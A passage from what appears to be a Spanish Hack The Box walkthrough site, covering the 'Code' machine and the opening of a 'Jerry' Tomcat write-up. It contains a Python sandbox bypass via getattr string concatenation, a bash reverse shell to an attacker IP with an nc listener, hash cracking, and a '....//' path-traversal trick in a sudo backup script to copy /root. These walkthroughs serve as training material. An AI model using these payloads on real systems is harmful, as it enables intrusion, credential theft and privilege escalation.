style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'s'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].\u003C/span>\u003Cspan style=\"color:#79B8FF\">__dict__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">](\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'ls'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"ejecución-de-comandos-en-el-sistema\">Ejecución de comandos en el sistema\u003C/h4>\n\u003Cp>Esto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como \u003Cstrong>≪import≫\u003C/strong> u \u003Cstrong>≪os≫\u003C/strong> directamente, utilizando la concatenación de cadenas, es decir, \u003Cstrong>≪o≫\u003C/strong> + \u003Cstrong>≪s≫\u003C/strong>. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando \u003Cstrong>tcpdump\u003C/strong> para capturar la respuesta del comando \u003Cstrong>ping\u003C/strong> ejecutado desde el servicio web.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'ping -c 1 10.10.x.x'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ejecución del código python en la web:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload2.png\">\u003Cimg src=\"/code/payload2.png\" alt=\"Código python en la web\">\u003C/a>\u003C/p>\n\u003Cp>Recibimos respuesta por parte del servido al ejecutar el comandon \u003Cstrong>ping\u003C/strong>:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/term1.png\">\u003Cimg src=\"/code/term1.png\" alt=\"Respuesta del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente ejecutaremos el siguiente código en el servicio web para obtener una \u003Cstrong>shell inversa\u003C/strong> mediante \u003Cstrong>Netcat\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'bash -c \"bash -i >&#x26; /dev/tcp/10.10.x.x/443 0>&#x26;1\" '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Y ejecutamos en nuestra máquina de atacante \u003Cstrong>Netcat\u003C/strong> en el puerto que especificamos en el comando anterior:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">nc\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lnvp\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 443\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Al ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una \u003Cstrong>shell inversa\u003C/strong>. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload3.png\">\u003Cimg src=\"/code/payload3.png\" alt=\"Ejecucion del código en el servicio web para obtener una shell inversa\">\u003C/a>\u003C/p>\n\u003Cp>Obtenemos una \u003Cstrong>Shell Inversa\u003C/strong> como \u003Cstrong>“app-production”\u003C/strong> que es el usuario que esta corriendo el servicio web:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/nc.png\">\u003Cimg src=\"/code/nc.png\" alt=\"Obteción de la revert shell\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente, se procede a realizar un tratamiento de la \u003Cstrong>TTY\u003C/strong> con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como \u003Cstrong>Ctrl + C\u003C/strong>, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># En la shell inversa obtenida, ejecutar:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">python3\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -c\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ’import\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> pty\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#B392F0\">pty.spawn(\u003C/span>\u003Cspan style=\"color:#B392F0\">\"/bin/bash\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)’\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Ctrl+Z\u003C/span>\u003Cspan style=\"color:#6A737D\"> # Presionar las teclas\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">stty\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> raw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -echo\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#79B8FF\">fg\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">reset\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> xterm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">export\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TERM\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">xterm\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>En la parpeta \u003Cstrong>home\u003C/strong> del usuario \u003Cstrong>app-production\u003C/strong> se encuentra la flag del usuario para ingresar en la plataforma:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/user.png\">\u003Cimg src=\"/code/user.png\" alt=\"Flag de user\">\u003C/a>\u003C/p>\n\u003Cp>Al listar los archivos y carpetas de la máquina encontramos un archivo database.db en la ruta \u003Cstrong>“/home/app-production/app/instance/database.db”\u003C/strong> al inspecionar el archivo encontramos credenciales en \u003Cstrong>“md5”\u003C/strong> las cuales intentamos romper obteniendo así la contraseña del usuario \u003Cstrong>development\u003C/strong> y \u003Cstrong>martin\u003C/strong>:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/sqlite.png\">\u003Cimg src=\"/code/sqlite.png\" alt=\"Archivo sqlite\">\u003C/a>\u003C/p>\n\u003Cp>Al utilizar hashcat para realizar un ataque de fuerza bruta mediante diccionario y romper las contraseñas obtenemos la contraseña del usuario martin:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/hashcat.png\">\u003Cimg src=\"/code/hashcat.png\" alt=\"Contraseña de martin\">\u003C/a>\u003C/p>\n\u003Cp>Al intentar conectarno a la máquina mediante \u003Cstrong>ssh\u003C/strong> como el usuario \u003Cstrong>martin\u003C/strong> obtenemos acceso:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/martin01.png\">\u003Cimg src=\"/code/martin01.png\" alt=\"Acceso a la máquina\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente hacemos un reconocimiento de los servicios y permisos que tiene el usuario martin al listar los privilegios del usuario con el comando “sudo -l” encontramos que puede ejecutar el comando “backy.sh” como root:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/martin02.png\">\u003Cimg src=\"/code/martin02.png\" alt=\"enumeracion del sistama como martin\">\u003C/a>\u003C/p>\n\u003Cp>Realizamos un reconocimiento del script para detectar si tiene alguna bulnerabilidad encontrando que la tarea que realiza es recibir como entrada un archivo \u003Cstrong>json\u003C/strong> que contiene una lista de directorios para realizar un backup de los mismos:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#!/bin/bash\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [[ \u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#6A737D\"># -ne 1 ]]; then\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    /\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">echo \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Usage: $0 &#x3C;task.json>\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    exit\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">fi\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">json_file=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$1\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [[ ! \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\">f \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$json_file\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ]]; then\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    /\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">echo \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Error: File '$json_file' not found.\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    exit\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">fi\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">allowed_paths=(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/var/\"\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"/home/\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">updated_json=\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">jq \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'.directories_to_archive |= map(gsub(\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">./\"; \"\"))'\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"$json_file\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">echo \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$updated_json\"\u003C/span>\u003Cspan style=\"color:#F97583\"> >\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"$json_file\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">directories_to_archive=\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">echo \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$updated_json\"\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#F97583\"> /\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">jq \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\">r \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'.directories_to_archive[]'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">is_allowed_path() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local path=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$1\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> allowed_path \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"$\u003C/span>\u003Cspan style=\"color:#79B8FF\">{allowed_paths[@]}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; do\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [[ \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$path\"\u003C/span>\u003Cspan style=\"color:#F97583\"> ==\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\"> $\u003C/span>\u003Cspan style=\"color:#E1E4E8\">allowed_path\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ]]; then\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        fi\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    done\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dir\u003C/span>\u003Cspan style=\"color:#F97583\"> in\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\"> $\u003C/span>\u003Cspan style=\"color:#E1E4E8\">directories_to_archive; do\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ! is_allowed_path \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$dir\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; then\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        /\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">echo \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        exit\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    fi\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">done\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">backy \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"$json_file\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Encontramos una vulnerabilidad en la linea:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">updated_json\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">usr\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\">bin\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">jq \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'.directories_to_archive |= map(gsub(\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">./\"; \"\"))'\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"$json_file\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>En donde el script realiza un filtrado de un path traversal eliminando el \u003Cstrong>\u003Ccode>../\u003C/code>\u003C/strong>, pero solo lo hace una vez, permitiéndonos escribir \u003Cstrong>\u003Ccode>....//\u003C/code>\u003C/strong> en el archivo JSON para apuntar a otro directorio como ser el directorio \u003Cstrong>root\u003C/strong>.\u003C/p>\n\u003Cp>En el directorio home del usuario martin encontramos un directorio con el nombre backups al ingresar en el encontramos un comprimido \u003Cstrong>.tar.bz2\u003C/strong> y un archivo \u003Cstrong>task.json\u003C/strong> al investigar el archivo json enconramos:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/task01.png\">\u003Cimg src=\"/code/task01.png\" alt=\"Arvhivo task\">\u003C/a>\u003C/p>\n\u003Cp>Al editar el campo \u003Ccode>directories_to_archive\u003C/code> y sustituir \u003Ccode>/home/app-production/app\u003C/code> por \u003Ccode>/home/....//root\u003C/code> dando como resultado en el archivo json:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/task02.png\">\u003Cimg src=\"/code/task02.png\" alt=\"Archivo json modificado\">\u003C/a>\u003C/p>\n\u003Cp>Al ejecutar el comando \u003Ccode>sudo /usr/bin/backy.sh\u003C/code> generamos un backup de la ruta \u003Ccode>/root\u003C/code> que lo almacena en el directorio \u003Ccode>/home/martin/backups\u003C/code> como un comprimido \u003Ccode>.tar.bz2\u003C/code> en el cual se encuentra al directorio del usuario \u003Cstrong>root\u003C/strong>:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/task03.png\">\u003Cimg src=\"/code/task03.png\" alt=\"Generar comprimido directorio root\">\u003C/a>\u003C/p>\n\u003Cp>Proseguimos con descomprimir el archivo generado y asi poder obtener la flag del usuario \u003Cstrong>root\u003C/strong> y si deseamo podemos conectarnos como dicho usuario mediante \u003Cstrong>ssh\u003C/strong> debido a que obtenemos acesso a su \u003Cstrong>clave ssh\u003C/strong>.\u003C/p>",{"headings":33,"localImagePaths":75,"remoteImagePaths":76,"frontmatter":77,"imagePaths":79},[34,38,41,45,48,51,54,57,60,63,66,69,72],{"depth":35,"slug":36,"text":37},3,"descripción","Descripción",{"depth":35,"slug":39,"text":40},"objetivos","Objetivos",{"depth":42,"slug":43,"text":44},4,"objetivo-general","Objetivo general",{"depth":42,"slug":46,"text":47},"objetivos-especificos","Objetivos Especificos",{"depth":35,"slug":49,"text":50},"analisis-de-vulnerabilidades","Analisis de Vulnerabilidades",{"depth":42,"slug":52,"text":53},"reconocimiento-inicial","Reconocimiento Inicial",{"depth":35,"slug":55,"text":56},"analisis-de-los-servicios-activos","Analisis de los servicios activos",{"depth":42,"slug":58,"text":59},"puerto-22-ssh","Puerto 22 (SSH)",{"depth":42,"slug":61,"text":62},"puerto-5000-servicio-web","Puerto 5000 (Servicio Web)",{"depth":35,"slug":64,"text":65},"explotación-del-sistema","Explotación del Sistema",{"depth":42,"slug":67,"text":68},"uso-de-build-in","Uso de build-in",{"depth":35,"slug":70,"text":71},"uso-de-getattr-para-evadir-restricciones-en-python","Uso de getattr para evadir restricciones en Python",{"depth":42,"slug":73,"text":74},"ejecución-de-comandos-en-el-sistema","Ejecución de comandos en el sistema",[],[],{"title":14,"os":15,"dificultad":18,"img":16,"skills":78,"plataforma":17,"description":26},[20,21,22,23,24,25],[],"code.md","jerry",{"id":81,"data":83,"body":92,"filePath":93,"digest":94,"rendered":95,"legacyId":117},{"title":84,"os":85,"img":86,"plataforma":17,"dificultad":18,"skills":87,"description":91},"Jerry","Windows","jerry/jerry_logo.png",[20,88,89,90],"Enumerating Tomcat","Information Leakage","Abusing Tomcat WAR uploads (Privilege Escalation)","Jerry es una máquina Windows de dificultad fácil que muestra cómo explotar Apache Tomcat, lo que conduce a un revert shell como el usuario NT Authority\\SYSTEM, comprometiendo así por completo el objetivo.","### Descripción\n\nJerry es una máquina Windows catalogada con un nivel de dificultad fácil en la plataforma Hack The Box. Su principal enfoque es demostrar la explotación de Apache Tomcat, un servidor de aplicaciones ampliamente utilizado en entornos empresariales.\n\nEl reto comienza con un reconocimiento inicial que permite identificar el servicio Tomcat en ejecución y acceder a su panel de administración. A partir de ahí, se explora la posibilidad de autenticarse o abusar de configuraciones por defecto para desplegar un archivo malicioso (WAR). Este procedimiento conduce a la obtención de un reverse shell dentro del sistema.\n\nUna vez establecido el acceso, se observa que el proceso comprometido se está ejecutando con privilegios elevados, específicamente como NT Authority\\SYSTEM, la cuenta con mayor nivel de permisos en sistemas Windows. Esto implica un control total del objetivo\n\n### Objetivos\n\n#### Objetivo general\n\nComprender y aplicar técnicas de explotación en un entorno Windows vulnerable, utilizando debilidades en la configuración de Apache Tomcat, con el fin de obtener acceso privilegiado y comprometer completamente el sistema.\n\n#### Objetivos Especificos\n\n- Realizar un proceso de reconocimiento para identificar servicios expuestos y tecnologías en uso.\n- Detectar la presencia del servidor Apache Tomcat y analizar posibles credenciales o configuraciones por defecto.\n- Explorar la carga de archivos maliciosos (WAR) como vector de ataque para obtener un reverse shell.\n- Validar el nivel de privilegios obtenidos y comprobar la ejecución bajo la cuenta NT Authority\\SYSTEM. \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n![Ejecución del comando ping](/jerry/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n![Ejecución del comando ping](/jerry/nmap.png)\n\nEste proceso inicial permitió obtener 